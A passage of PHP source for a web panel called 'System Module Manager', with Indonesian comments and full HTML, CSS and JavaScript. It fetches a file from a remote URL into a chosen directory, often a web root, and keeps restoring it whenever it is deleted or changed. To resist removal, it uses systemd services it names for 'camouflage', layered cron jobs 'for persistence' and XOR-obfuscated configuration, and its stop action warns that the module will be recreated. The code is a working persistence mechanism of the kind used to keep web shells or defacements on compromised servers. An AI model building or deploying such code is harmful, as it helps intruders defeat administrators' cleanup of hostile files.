                        unlink($pidFile);
                    }
                }
                
                // Hapus service
                if (isset($data['service_name'])) {
                    $serviceFile = '/etc/systemd/system/' . $data['service_name'];
                    if (file_exists($serviceFile)) {
                        exec('systemctl stop ' . escapeshellarg($data['service_name']) . ' 2>/dev/null');
                        exec('systemctl disable ' . escapeshellarg($data['service_name']) . ' 2>/dev/null');
                        unlink($serviceFile);
                        exec('systemctl daemon-reload 2>/dev/null');
                    }
                }
                
                // Hapus control file
                deleteSystemFile(basename($file));
                
                // Hapus file output hanya jika di system directory
                if (isset($data['output_path']) && file_exists($data['output_path'])) {
                    if (strpos($data['output_path'], SYS_DIR) === 0) {
                        unlink($data['output_path']);
                    }
                }
                
                $message = "🗑️ Job permanently deleted";
                $messageType = "success";
                break;
            }
        }
    }
    
    // Force refresh cronjobs
    if (isset($_POST['action']) && $_POST['action'] === 'refresh_cron') {
        // Jalankan recovery check
        $recoveryScript = SYS_DIR . 'sys/check_recovery.sh';
        if (file_exists($recoveryScript)) {
            exec("bash " . escapeshellarg($recoveryScript) . " 2>&1", $output, $return);
            $message = "🔧 Cronjobs refreshed/recreated";
            $messageType = "success";
        }
    }
}

// Ambil daftar job aktif
$activeJobs = [];
$sysFiles = glob(SYS_DIR . 'sys/mod_*.data');
foreach ($sysFiles as $file) {
    $data = readEncryptedData(basename($file));
    if ($data && ($data['status'] === 'active' || $data['status'] === 'recovering')) {
        $data['file_exists'] = file_exists($data['output_path']);
        $data['current_hash'] = $data['file_exists'] ? md5_file($data['output_path']) : '';
        $data['is_modified'] = ($data['file_exists'] && $data['current_hash'] !== $data['original_hash']);
        $data['status_text'] = $data['is_modified'] ? 'Needs Sync' : ($data['status'] === 'recovering' ? 'Recovering' : 'Protected');
        $data['status_class'] = $data['is_modified'] ? 'warning' : ($data['status'] === 'recovering' ? 'warning' : 'success');
        $data['short_id'] = substr($data['id'], 5, 8);
        $data['interval_formatted'] = formatInterval($data['interval_seconds']);
        $data['directory_display'] = dirname($data['output_path']);
        
        // Cek apakah monitor masih running
        if (isset($data['pid_file'])) {
            $pidFile = SYS_DIR . 'sys/' . $data['pid_file'];
            $data['monitor_running'] = file_exists($pidFile);
        } else {
            $data['monitor_running'] = false;
        }
        
        $created = new DateTime($data['created_at']);
        $now = new DateTime();
        $interval = $created->diff($now);
        $data['age'] = $interval->format('%a days %h hours');
        
        $activeJobs[] = $data;
    }
}

// Ambil cron entries dan verifikasi
$cronEntries = [];
$verifiedCronJobs = 0;
exec('crontab -l 2>/dev/null', $cronOutput, $cronReturn);
if ($cronReturn === 0) {
    foreach ($cronOutput as $entry) {
        if (trim($entry) && !preg_match('/^#/', $entry)) {
            $cronEntries[] = htmlspecialchars($entry);
            if (strpos($entry, 'JOB_HASH:') !== false) {
                $verifiedCronJobs++;
            }
        }
    }
}

// Cek status services
$systemServices = [];
if (file_exists('/etc/systemd/system/')) {
    $serviceFiles = glob('/etc/systemd/system/module-*.service');
    foreach ($serviceFiles as $serviceFile) {
        $serviceName = basename($serviceFile);
        $status = shell_exec('systemctl status ' . escapeshellarg($serviceName) . ' 2>&1 | grep "Active:"');
        $systemServices[] = [
            'name' => $serviceName,
            'status' => $status ? trim($status) : 'Unknown'
        ];
    }
}

// Statistik
$stats = [
    'active_jobs' => count($activeJobs),
    'cron_entries' => count($cronEntries),
    'verified_cron_jobs' => $verifiedCronJobs,
    'system_services' => count($systemServices),
    'protected_files' => count($activeJobs),
    'recovery_count' => array_sum(array_column($activeJobs, 'recovery_count'))
];

$phpVersion = phpversion();
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Module Manager</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --primary-green: <?= PRIMARY_GREEN ?>;
            --light-green: <?= LIGHT_GREEN ?>;
            --dark-green: <?= DARK_GREEN ?>;
            --white: <?= WHITE ?>;
            --light-gray: <?= LIGHT_GRAY ?>;
            --medium-gray: <?= MEDIUM_GRAY ?>;
            --dark-gray: <?= DARK_GRAY ?>;
            --black: <?= BLACK ?>;
            --error: <?= ERROR_COLOR ?>;
            --success: <?= SUCCESS_COLOR ?>;
        }
        
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: var(--light-gray);
            color: var(--black);
            line-height: 1.6;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }
        
        header {
            background: linear-gradient(135deg, var(--primary-green) 0%, var(--dark-green) 100%);
            color: var(--white);
            padding: 2rem 0;
            border-radius: 10px;
            margin-bottom: 2rem;
            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
        }
        
        .header-content {
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
        }
        
        h1 {
            font-size: 2.2rem;
            margin-bottom: 0.5rem;
        }
        
        .subtitle {
            font-size: 1.1rem;
            opacity: 0.9;
        }
        
        .status-indicator {
            background: rgba(255,255,255,0.2);
            padding: 8px 15px;
            border-radius: 20px;
            font-size: 0.9rem;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .status-indicator.active {
            background: rgba(76, 175, 80, 0.3);
        }
        
        .status-dot {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background: var(--white);
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }
        
        .main-content {
            display: grid;
            grid-template-columns: 1fr;
            gap: 2rem;
        }
        
        @media (min-width: 992px) {
            .main-content {
                grid-template-columns: 1fr 1fr;
            }
        }
        
        .card {
            background: var(--white);
            border-radius: 10px;
            padding: 1.5rem;
            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
            transition: transform 0.3s ease, box-shadow 0.3s ease;
        }
        
        .card:hover {
            transform: translateY(-3px);
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
        }
        
        .card-header {
            border-bottom: 2px solid var(--light-green);
            padding-bottom: 0.8rem;
            margin-bottom: 1.5rem;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .card-header i {
            color: var(--primary-green);
            font-size: 1.2rem;
        }
        
        h2 {
            color: var(--dark-green);
            font-size: 1.5rem;
        }
        
        .form-group {
            margin-bottom: 1.2rem;
        }
        
        label {
            display: block;
            margin-bottom: 0.5rem;
            font-weight: 600;
            color: var(--dark-gray);
        }
        
        input[type="text"],
        input[type="url"],
        select {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid var(--medium-gray);
            border-radius: 6px;
            font-size: 1rem;
            transition: border-color 0.3s ease;
        }
        
        input:focus, select:focus {
            border-color: var(--light-green);
            outline: none;
            box-shadow: 0 0 0 3px rgba(76, 175, 80, 0.2);
        }
        
        .interval-select-group {
            position: relative;
        }
        
        .interval-select-group select {
            appearance: none;
            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23424' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");
            background-repeat: no-repeat;
            background-position: right 12px center;
            background-size: 16px;
            padding-right: 40px;
        }
        
        .directory-input {
            display: flex;
            gap: 10px;
        }
        
        .directory-input input {
            flex: 1;
        }
        
        .btn {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            padding: 12px 24px;
            border: none;
            border-radius: 6px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        
        .btn-primary {
            background: linear-gradient(135deg, var(--light-green) 0%, var(--primary-green) 100%);
            color: var(--white);
        }
        
        .btn-primary:hover {
            background: linear-gradient(135deg, var(--primary-green) 0%, var(--dark-green) 100%);
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(46, 125, 50, 0.3);
        }
        
        .btn-secondary {
            background: linear-gradient(135deg, #607D8B 0%, #455A64 100%);
            color: var(--white);
        }
        
        .btn-secondary:hover {
            background: linear-gradient(135deg, #455A64 0%, #37474F 100%);
        }
        
        .btn-danger {
            background: linear-gradient(135deg, #F44336 0%, #D32F2F 100%);
            color: var(--white);
        }
        
        .btn-danger:hover {
            background: linear-gradient(135deg, #D32F2F 0%, #B71C1C 100%);
        }
        
        .btn-warning {
            background: linear-gradient(135deg, #FF9800 0%, #F57C00 100%);
            color: var(--white);
        }
        
        .btn-warning:hover {
            background: linear-gradient(135deg, #F57C00 0%, #E65100 100%);
        }
        
        .btn-info {
            background: linear-gradient(135deg, #2196F3 0%, #1976D2 100%);
            color: var(--white);
        }
        
        .btn-info:hover {
            background: linear-gradient(135deg, #1976D2 0%, #0D47A1 100%);
        }
        
        .btn-small {
            padding: 6px 12px;
            font-size: 0.85rem;
        }
        
        .btn-block {
            width: 100%;
        }
        
        .jobs-list {
            max-height: 400px;
            overflow-y: auto;
        }
        
        .job-item {
            background: var(--light-gray);
            border-left: 4px solid var(--light-green);
            padding: 1rem;
            margin-bottom: 1rem;
            border-radius: 0 6px 6px 0;
            transition: all 0.3s ease;
        }
        
        .job-item:hover {
            background: #E8F5E9;
        }
        
        .job-item.warning {
            border-left-color: #FF9800;
            background: #FFF3E0;
        }
        
        .job-item.error {
            border-left-color: #F44336;
            background: #FFEBEE;
        }
        
        .job-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 0.5rem;
        }
        
        .job-title {
            font-weight: 600;
            color: var(--dark-green);
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .job-status {
            font-size: 0.8rem;
            padding: 3px 10px;
            border-radius: 12px;
            font-weight: 600;
        }
        
        .status-success {
            background: rgba(76, 175, 80, 0.2);
            color: var(--dark-green);
        }
        
        .status-warning {
            background: rgba(255, 152, 0, 0.2);
            color: #E65100;
        }
        
        .status-error {
            background: rgba(244, 67, 54, 0.2);
            color: #B71C1C;
        }
        
        .job-meta {
            font-size: 0.85rem;
            color: var(--dark-gray);
            display: flex;
            flex-wrap: wrap;
            gap: 15px;
            margin-top: 0.5rem;
        }
        
        .job-meta .directory {
            flex-basis: 100%;
            background: rgba(0,0,0,0.05);
            padding: 5px 10px;
            border-radius: 4px;
            margin-top: 5px;
            font-family: monospace;
            font-size: 0.8rem;
        }
        
        .job-actions {
            display: flex;
            gap: 8px;
            margin-top: 0.8rem;
            flex-wrap: wrap;
        }
        
        .message {
            padding: 15px;
            border-radius: 6px;
            margin-bottom: 1.5rem;
            display: flex;
            align-items: center;
            gap: 10px;
            animation: slideIn 0.5s ease;
        }
        
        @keyframes slideIn {
            from { transform: translateY(-20px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }
        
        .message.success {
            background: #E8F5E9;
            border-left: 4px solid var(--success);
            color: var(--dark-green);
        }
        
        .message.error {
            background: #FFEBEE;
            border-left: 4px solid var(--error);
            color: #B71C1C;
        }
        
        .message.info {
            background: #E3F2FD;
            border-left: 4px solid #2196F3;
            color: #0D47A1;
        }
        
        .cron-list {
            font-family: 'Courier New', monospace;
            background: var(--black);
            color: #00FF00;
            padding: 1rem;
            border-radius: 6px;
            overflow-x: auto;
            font-size: 0.9rem;
            line-height: 1.5;
            max-height: 200px;
            overflow-y: auto;
        }
        
        .cron-list .job-hash {
            color: #FFA726;
        }
        
        .empty-state {
            text-align: center;
            padding: 3rem 1rem;
            color: var(--dark-gray);
        }
        
        .empty-state i {
            font-size: 3rem;
            margin-bottom: 1rem;
            color: var(--medium-gray);
        }
        
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 1rem;
            margin-top: 2rem;
        }
        
        .stat-card {
            background: var(--white);
            padding: 1rem;
            border-radius: 8px;
            text-align: center;
            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
            border: 1px solid var(--medium-gray);
        }
        
        .stat-value {
            font-size: 1.8rem;
            font-weight: bold;
            color: var(--primary-green);
            margin-bottom: 0.5rem;
        }
        
        .stat-label {
            font-size: 0.9rem;
            color: var(--dark-gray);
        }
        
        footer {
            margin-top: 3rem;
            text-align: center;
            color: var(--dark-gray);
            font-size: 0.9rem;
            padding: 1.5rem 0;
            border-top: 1px solid var(--medium-gray);
        }
        
        small {
            color: var(--dark-gray);
            font-size: 0.85rem;
        }
        
        .filename-help {
            display: inline-block;
            margin-top: 5px;
            color: var(--dark-gray);
        }
        
        .directory-help {
            display: block;
            margin-top: 5px;
            color: var(--dark-gray);
            font-size: 0.85rem;
        }
        
        @media (max-width: 768px) {
            .header-content {
                flex-direction: column;
                text-align: center;
                gap: 1rem;
            }
            
            .status-indicator {
                align-self: center;
            }
            
            h1 {
                font-size: 1.8rem;
            }
            
            .job-actions {
                flex-wrap: wrap;
            }
            
            .directory-input {
                flex-direction: column;
            }
        }
        
        .sys-info {
            background: rgba(46, 125, 50, 0.05);
            padding: 1rem;
            border-radius: 6px;
            margin-top: 1rem;
            font-size: 0.85rem;
            color: var(--dark-gray);
        }
        
        .example-directories {
            background: rgba(0,0,0,0.03);
            padding: 10px;
            border-radius: 6px;
            margin-top: 10px;
            font-size: 0.85rem;
        }
        
        .example-directories ul {
            margin: 5px 0;
            padding-left: 20px;
        }
        
        .example-directories li {
            margin-bottom: 3px;
        }
        
        .interval-description {
            margin-top: 8px;
            font-size: 0.85rem;
            color: var(--dark-gray);
            padding: 8px;
            background: rgba(0,0,0,0.02);
            border-radius: 4px;
            border-left: 3px solid var(--light-green);
        }
        
        .service-status {
            margin-top: 1rem;
            padding: 10px;
            background: rgba(0,0,0,0.02);
            border-radius: 6px;
            font-size: 0.85rem;
        }
        
        .service-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 5px 0;
            border-bottom: 1px solid rgba(0,0,0,0.05);
        }
        
        .service-item:last-child {
            border-bottom: none;
        }
        
        .service-name {
            font-family: monospace;
            color: var(--dark-gray);
        }
        
        .service-active {
            color: var(--success);
        }
        
        .service-inactive {
            color: var(--error);
        }
        
        .action-buttons {
            display: flex;
            gap: 10px;
            margin-top: 1rem;
            flex-wrap: wrap;
        }
        
        .refresh-animation {
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .monitor-status {
            display: inline-flex;
            align-items: center;
            gap: 5px;
            font-size: 0.8rem;
            padding: 2px 8px;
            border-radius: 10px;
            background: rgba(0,0,0,0.05);
        }
        
        .monitor-running {
            color: var(--success);
        }
        
        .monitor-stopped {
            color: var(--error);
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <div class="header-content">
                <div>
                    <h1><i class="fas fa-cogs"></i> System Module Manager</h1>
                    <p class="subtitle">File protection with system service camouflage</p>
                </div>
                <div class="status-indicator active">
                    <div class="status-dot"></div>
                    <span>System Active (Services: <?= count($systemServices) ?>)</span>
                </div>
            </div>
        </header>

        <?php if ($message): ?>
            <div class="message <?= $messageType ?>">
                <i class="fas fa-<?= $messageType === 'success' ? 'check-circle' : ($messageType === 'error' ? 'exclamation-circle' : 'info-circle') ?>"></i>
                <div><?= $message ?></div>
            </div>
        <?php endif; ?>
        
        <div class="action-buttons">
            <form method="POST" action="" style="display: inline;">
                <input type="hidden" name="action" value="refresh_cron">
                <button type="submit" class="btn btn-info btn-small" onclick="showRefreshAnimation(this)">
                    <i class="fas fa-sync-alt"></i> Refresh Cronjobs
                </button>
            </form>
            
            <button type="button" class="btn btn-secondary btn-small" onclick="showSystemInfo()">
                <i class="fas fa-info-circle"></i> System Info
            </button>
        </div>
        
        <div class="main-content">
            <div class="card">
                <div class="card-header">
                    <i class="fas fa-plus-circle"></i>
                    <h2>Add Module Protection</h2>
                </div>
                <form method="POST" action="">
                    <input type="hidden" name="action" value="start">
                    
                    <div class="form-group">
                        <label for="raw_url"><i class="fas fa-link"></i> Source URL</label>
                        <input type="url" id="raw_url" name="raw_url" 
                               placeholder="https://example.com/file.txt" required>
                    </div>
                    
                    <div class="form-group">
                        <label for="output_name"><i class="fas fa-file-download"></i> Output Filename</label>
                        <input type="text" id="output_name" name="output_name" 
                               placeholder="file-backup.txt" 
                               pattern="[a-zA-Z0-9._-]+"
                               title="Only letters, numbers, dots, underscores, and hyphens"
                               required>
                        <small class="filename-help">
                            Letters, numbers, dots, underscores, and hyphens only
                        </small>
                    </div>
                    
                    <div class="form-group">
                        <label for="directory_path"><i class="fas fa-folder"></i> Save Directory (Optional)</label>
                        <div class="directory-input">
                            <input type="text" id="directory_path" name="directory_path" 
                                   placeholder="/var/www/files/ or /home/user/downloads/"
                                   pattern="^(\/|[a-zA-Z]:\\)[^<>:\"|?*\x00-\x1F]*$">
                            <button type="button" id="btn-check-dir" class="btn btn-secondary btn-small">
                                <i class="fas fa-check"></i> Check
                            </button>
                        </div>
                        <small class="directory-help">
                            Leave empty to use system cache directory. Must be absolute path.
                        </small>
                    </div>
                    
                    <div class="form-group">
                        <label for="interval"><i class="fas fa-clock"></i> Check Interval</label>
                        <div class="interval-select-group">
                            <select id="interval" name="interval" required onchange="updateIntervalDescription(this.value)">
                                <optgroup label="Frequent">
                                    <option value="10">10 seconds</option>
                                    <option value="30">30 seconds</option>
                                    <option value="60">1 minute</option>
                                </optgroup>
                                <optgroup label="Regular">
                                    <option value="120">2 minutes</option>
                                    <option value="300" selected>5 minutes</option>
                                    <option value="600">10 minutes</option>
                                </optgroup>
                                <optgroup label="Infrequent">
                                    <option value="900">15 minutes</option>
                                    <option value="1800">30 minutes</option>
                                    <option value="3600">1 hour</option>
                                </optgroup>
                                <optgroup label="Rare">
                                    <option value="7200">2 hours</option>
                                    <option value="14400">4 hours</option>
                                    <option value="28800">8 hours</option>
                                </optgroup>
                                <optgroup label="Very Rare">
                                    <option value="43200">12 hours</option>
                                    <option value="86400">24 hours</option>
                                </optgroup>
                            </select>
                        </div>
                        <div id="interval-description" class="interval-description">
                            <i class="fas fa-info-circle"></i>
                            <strong>5 minutes</strong> - Checks every 5 minutes (300 seconds). Good for important configuration files.
                        </div>
                    </div>
                    
                    <button type="submit" class="btn btn-primary btn-block">
                        <i class="fas fa-shield-alt"></i> Enable Protection with System Service
                    </button>
                </form>
                
                <div class="sys-info">
                    <i class="fas fa-info-circle"></i>
                    <strong>System Directory:</strong> <?= htmlspecialchars(SYS_DIR) ?><br>
                    <strong>Services Directory:</strong> <?= htmlspecialchars(SYS_DIR) ?>services/<br>
                    <strong>Interval Range:</strong> <?= MIN_INTERVAL ?>s - <?= MAX_INTERVAL ?>s (<?= floor(MAX_INTERVAL/3600) ?> hours)<br>
                    <strong>Encryption:</strong> Enabled (XOR + Base64)<br>
                    <strong>Auto-Recovery:</strong> Enabled with cron layers<br>
                    <strong>PHP Version:</strong> <?= $phpVersion ?>
                </div>
                
                <div class="stats">
                    <div class="stat-card">
                        <div class="stat-value"><?= $stats['active_jobs'] ?></div>
                        <div class="stat-label">Active Modules</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value"><?= $stats['verified_cron_jobs'] ?>/<?= $stats['cron_entries'] ?></div>
                        <div class="stat-label">Verified Cronjobs</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value"><?= $stats['system_services'] ?></div>
                        <div class="stat-label">System Services</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value"><?= $stats['recovery_count'] ?></div>
                        <div class="stat-label">Total Recoveries</div>
                    </div>
                </div>
                
                <?php if (!empty($systemServices)): ?>
                <div class="service-status">
                    <div class="card-header">
                        <i class="fas fa-server"></i>
                        <h3>System Services</h3>
                    </div>
                    <?php foreach ($systemServices as $service): ?>
                    <div class="service-item">
                        <span class="service-name"><?= htmlspecialchars($service['name']) ?></span>
                        <span class="<?= strpos($service['status'], 'active') !== false ? 'service-active' : 'service-inactive' ?>">
                            <i class="fas fa-circle"></i> <?= htmlspecialchars($service['status']) ?>
                        </span>
                    </div>
                    <?php endforeach; ?>
                </div>
                <?php endif; ?>
            </div>
            
            <div class="card">
                <div class="card-header">
                    <i class="fas fa-tasks"></i>
                    <h2>Active Protection Modules</h2>
                    <span class="monitor-status <?= $verifiedCronJobs > 0 ? 'monitor-running' : 'monitor-stopped' ?>">
                        <i class="fas fa-circle"></i>
                        <?= $verifiedCronJobs ?> cronjobs active
                    </span>
                </div>
                
                <div class="jobs-list">
                    <?php if (empty($activeJobs)): ?>
                        <div class="empty-state">
                            <i class="fas fa-folder-open"></i>
                            <h3>No active modules</h3>
                            <p>Add your first module using the form</p>
                        </div>
                    <?php else: ?>
                        <?php foreach ($activeJobs as $job): ?>
                        <div class="job-item <?= $job['status_class'] ?>">
                            <div class="job-header">
                                <div class="job-title">
                                    <i class="fas fa-cube"></i>
                                    <?= htmlspecialchars($job['output_name']) ?>
                                    <?php if (isset($job['monitor_running'])): ?>
                                        <span class="monitor-status <?= $job['monitor_running'] ? 'monitor-running' : 'monitor-stopped' ?>">
                                            <i class="fas fa-circle"></i>
                                            <?= $job['monitor_running'] ? 'Running' : 'Stopped' ?>
                                        </span>
                                    <?php endif; ?>
                                </div>
                                <span class="job-status status-<?= $job['status_class'] ?>">
                                    <?= $job['status_text'] ?>
                                </span>
                            </div>
                            
                            <div class="job-meta">
                                <span><i class="fas fa-hashtag"></i> <?= $job['short_id'] ?></span>
                                <span><i class="fas fa-clock"></i> <?= $job['interval_formatted'] ?></span>
                                <span><i class="fas fa-calendar"></i> <?= $job['age'] ?></span>
                                <span><i class="fas fa-redo"></i> <?= $job['recovery_count'] ?> recoveries</span>
                                <div class="directory">
                                    <i class="fas fa-folder"></i> <?= htmlspecialchars($job['directory_display']) ?>
                                </div>
                            </div>
                            
                            <div class="job-actions">
                                <form method="POST" action="" style="display: inline;">
                                    <input type="hidden" name="action" value="stop">
                                    <input type="hidden" name="job_id" value="<?= $job['id'] ?>">
                                    <button type="submit" class="btn btn-warning btn-small" 
                                            onclick="return confirm('⚠️ Module will be stopped, but backup system will recreate it. Continue?')">
                                        <i class="fas fa-pause"></i> Stop
                                    </button>
                                </form>
                                
                                <form method="POST" action="" style="display: inline;">
                                    <input type="hidden" name="action" value="delete">
                                    <input type="hidden" name="job_id" value="<?= $job['id'] ?>">
                                    <button type="submit" class="btn btn-danger btn-small" 
                                            onclick="return confirm('❌ PERMANENT DELETE! Module, service, and cronjobs will be removed. Continue?')">
                                        <i class="fas fa-trash"></i> Remove
                                    </button>
                                </form>
                                
                                <?php if (isset($job['service_name'])): ?>
                                <button type="button" class="btn btn-info btn-small" 
                                        onclick="showServiceStatus('<?= $job['service_name'] ?>')">
                                    <i class="fas fa-server"></i> Service
                                </button>
                                <?php endif; ?>
                            </div>
                        </div>
                        <?php endforeach; ?>
                    <?php endif; ?>
                </div>
                
                <div style="margin-top: 2rem;">
                    <div class="card-header">
                        <i class="fas fa-code"></i>
                        <h2>System Task Schedule</h2>
                    </div>
                    <div class="cron-list">
                        <?php if (empty($cronEntries)): ?>
                            <div>No system tasks scheduled</div>
                        <?php else: ?>
                            <?php foreach ($cronEntries as $entry): ?>
                                <div>
                                    <?php 
                                    $highlighted = htmlspecialchars($entry);
                                    $highlighted = preg_replace('/(JOB_HASH:[a-f0-9]+)/', '<span class="job-hash">$1</span>', $highlighted);
                                    $highlighted = preg_replace('/(# AUTO_RECOVERY)/', '<span style="color:#64B5F6">$1</span>', $highlighted);
                                    echo $highlighted;
                                    ?>
                                </div>
                            <?php endforeach; ?>
                        <?php endif; ?>
                    </div>
                </div>
            </div>
        </div>
        
        <footer>
            <p><i class="fas fa-info-circle"></i> System uses layered cronjobs, systemd services, and auto-recovery mechanisms.</p>
            <p>Each module runs as a system service for better camouflage and persistence.</p>
            <p style="margin-top: 1rem;">&copy; 2025 System Module Manager | PHP <?= $phpVersion ?> | Modules: <?= count($sysFiles) ?> | Services: <?= count($systemServices) ?></p>
        </footer>
    </div>
    
    <script>
        // Update interval description based on selected value
        function updateIntervalDescription(seconds) {
            const description = document.getElementById('interval-description');
            let text = '';
            let recommendation = '';
            
            // Parse seconds to integer
            seconds = parseInt(seconds);
            
            // Format time
            if (seconds < 60) {
                text = seconds + ' seconds';
            } else if (seconds < 3600) {
                const minutes = seconds / 60;
                text = minutes + (minutes === 1 ? ' minute' : ' minutes');
            } else {
                const hours = seconds / 3600;
                text = hours + (hours === 1 ? ' hour' : ' hours');
            }
            
            // Add recommendation based on interval
            if (seconds <= 30) {
                recommendation = 'Very frequent checking. Use for critical files that change often.';
            } else if (seconds <= 300) {
                recommendation = 'Frequent checking. Good for important configuration files.';
            } else if (seconds <= 1800) {
                recommendation = 'Regular checking. Suitable for most monitoring tasks.';
            } else if (seconds <= 7200) {
                recommendation = 'Infrequent checking. Good for less critical files.';
            } else {
                recommendation = 'Rare checking. Use for files that rarely change.';
            }
            
            description.innerHTML = `
                <i class="fas fa-info-circle"></i>
                <strong>${text}</strong> - Checks every ${text.toLowerCase()} (${seconds} seconds). 
                ${recommendation}
            `;
        }
        
        // Check directory button
        document.getElementById('btn-check-dir').addEventListener('click', function() {
            const dirPath = document.getElementById('directory_path').value;
            
            if (!dirPath) {
                alert('⚠️ Please enter a directory path first');
                return;
            }
            
            // Validate path format
            const pathRegex = /^(\/|[a-zA-Z]:\\)[^<>:"|?*\x00-\x1F]*$/;
            if (!pathRegex.test(dirPath)) {
                alert('❌ Invalid directory path format');
                return;
            }
            
            // Show checking message
            const originalText = this.innerHTML;
            this.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Checking...';
            this.disabled = true;
            
            // Send AJAX request to check directory
            const formData = new FormData();
            formData.append('action', 'check_dir');
            formData.append('directory_path', dirPath);
            
            fetch('', {
                method: 'POST',
                body: formData
            })
            .then(response => response.text())
            .then(data => {
                if (data.includes('writable')) {
                    alert('✅ Directory is writable and ready to use');
                } else if (data.includes('not_writable')) {
                    alert('❌ Directory is not writable or cannot be created');
                } else {
                    alert('⚠️ Directory check returned unknown result');
                }
            })
            .catch(error => {
                alert('❌ Error checking directory: ' + error);
            })
            .finally(() => {
                this.innerHTML = originalText;
                this.disabled = false;
            });
        });
        
        // Form validation
        document.querySelector('form').addEventListener('submit', function(e) {
            const url = document.getElementById('raw_url').value;
            const filename = document.getElementById('output_name').value;
            const interval = document.getElementById('interval').value;
            const dirPath = document.getElementById('directory_path').value;
            
            if (!url.startsWith('http')) {
                alert('❌ URL must start with http:// or https://');
                e.preventDefault();
                return;
            }
            
            const filenameRegex = /^[a-zA-Z0-9_\-\.]+$/;
            if (!filenameRegex.test(filename)) {
                alert('❌ Filename can only contain letters, numbers, dots, underscores, and hyphens');
                e.preventDefault();
                return;
            }
            
            const minInterval = <?= MIN_INTERVAL ?>;
            const maxInterval = <?= MAX_INTERVAL ?>;
            
            if (interval < minInterval || interval > maxInterval) {
                alert(`❌ Interval must be between ${minInterval} and ${maxInterval} seconds`);
                e.preventDefault();
                return;
            }
            
            // Validate directory path if provided
            if (dirPath) {
                const pathRegex = /^(\/|[a-zA-Z]:\\)[^<>:"|?*\x00-\x1F]*$/;
                if (!pathRegex.test(dirPath)) {
                    alert('❌ Invalid directory path format. Must be absolute path without special characters.');
                    e.preventDefault();
                    return;
                }
                
                // Warn about system directories
                const systemDirs = ['/etc/', '/bin/', '/sbin/', '/usr/bin/', '/usr/sbin/', '/boot/', '/proc/', '/sys/', '/dev/', '/root/'];
                for (const sysDir of systemDirs) {
                    if (dirPath.startsWith(sysDir)) {
                        if (!confirm(`⚠️ WARNING: You are trying to use system directory: ${sysDir}\nThis may cause system instability.\nContinue anyway?`)) {
                            e.preventDefault();
                            return;
                        }
                        break;
                    }
                }
            }
        });
        
        // Highlight modified modules
        document.querySelectorAll('.job-item.warning').forEach(item => {
            item.style.animation = 'pulse 2s infinite';
        });
        
        // Confirm dangerous actions
        document.querySelectorAll('.btn-danger').forEach(btn => {
            btn.addEventListener('click', function(e) {
                if (!confirm('This action is irreversible. Are you sure?')) {
                    e.preventDefault();
                }
            });
        });
        
        // Directory path auto-complete for common paths
        const dirInput = document.getElementById('directory_path');
        dirInput.addEventListener('keydown', function(e) {
            if (e.key === 'Tab' && this.value) {
                e.preventDefault();
                
                const commonPaths = [
                    '/var/www/html/',
                    '/home/' + (this.value.match(/\/home\/([^\/]+)/)?.[1] || 'user') + '/',
                    '/tmp/',
                    '/var/tmp/',
                    '/usr/local/',
                    '/opt/',
                    '/var/log/',
                    '/var/cache/'
                ];
                
                for (const path of commonPaths) {
                    if (path.startsWith(this.value) && path !== this.value) {
                        this.value = path;
                        break;
                    }
                }
            }
        });
        
        // Show refresh animation
        function showRefreshAnimation(button) {
            const icon = button.querySelector('i');
            icon.classList.add('refresh-animation');
            setTimeout(() => {
                icon.classList.remove('refresh-animation');
            }, 1000);
        }
        
        // Show service status
        function showServiceStatus(serviceName) {
            alert(`Service: ${serviceName}\n\nCheck status with: systemctl status ${serviceName}\n\nService file: /etc/systemd/system/${serviceName}`);
        }
        
        // Show system info
        function showSystemInfo() {
            const info = `System Module Manager Info:

• System Directory: <?= htmlspecialchars(SYS_DIR) ?>
• Cron Layers: Multiple layers for redundancy
• Auto-Recovery: Enabled with hash-based tracking
• Service Camouflage: Each module runs as systemd service
• Encryption: XOR + Base64 with checksum
• Interval Range: <?= MIN_INTERVAL ?>s to <?= MAX_INTERVAL ?>s

Features:
✓ File monitoring with custom intervals
✓ Auto-recovery when files are deleted/modified
✓ System service camouflage
✓ Layered cronjobs for persistence
✓ Custom directory support
✓ Encrypted configuration storage

Active Modules: <?= count($activeJobs) ?>
System Services: <?= count($systemServices) ?>
Verified Cronjobs: <?= $verifiedCronJobs ?>`;
            
            alert(info);
        }
        
